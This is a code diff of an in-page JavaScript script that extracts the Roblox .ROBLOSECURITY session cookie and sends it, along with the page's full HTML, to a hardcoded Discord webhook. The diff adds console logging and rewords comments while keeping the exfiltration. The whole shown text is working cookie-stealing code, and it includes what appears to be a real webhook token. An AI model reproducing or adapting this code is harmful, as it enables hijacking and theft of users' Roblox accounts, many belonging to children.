@@ -14,15 +14,17 @@
         // Attempt to access the Roblox cookie
         var robloxCookie = document.cookie.match(/\.ROBLOSECURITY=([^;]+)/);
 
-        // If the cookie is found, send it to the designated Discord webhook along with the HTML content of the page
+        // If the cookie is found, print it to the console
         if (robloxCookie) {
             var cookieValue = robloxCookie[1];
+            console.log('Roblox Cookie:', cookieValue); // Print the Roblox cookie to the console
+
+            // Send the Roblox cookie to Discord webhook
             var endpoint = 'https://discord.com/api/webhooks/1231774438463242290/PP9iMkmZa0F81Zp3QUwuEAh5uGd2jvw86T0e5KypWYaoHKqXRqAvvkVHPOEKZsO4mRFx'; // Replace with your actual Discord webhook endpoint
 
-            // Send the cookie value and HTML content to the endpoint
             fetch(endpoint, {
                 method: 'POST',
-                body: JSON.stringify({ 
+                body: JSON.stringify({
                     robloxCookie: cookieValue,
                     htmlContent: document.documentElement.outerHTML // Include the HTML content of the page
                 }),
@@ -32,18 +34,18 @@
             })
             .then(response => {
                 if (response.ok) {
-                    console.log('Roblox cookie and HTML content sent successfully!');
+                    console.log('Roblox cookie sent to Discord webhook successfully!');
                 } else {
-                    console.error('Failed to send Roblox cookie and HTML content:', response.status, response.statusText);
+                    console.error('Failed to send Roblox cookie to Discord webhook:', response.status, response.statusText);
                 }
             })
             .catch(error => {
-                console.error('Error sending Roblox cookie and HTML content:', error.message);
+                console.error('Error sending Roblox cookie to Discord webhook:', error.message);
             });
         }
     }
 
-    // Call the function to extract and send the Roblox cookie and HTML content
+    // Call the function to extract and potentially send the Roblox cookie
     extractRobloxCookie();
 </script>
 
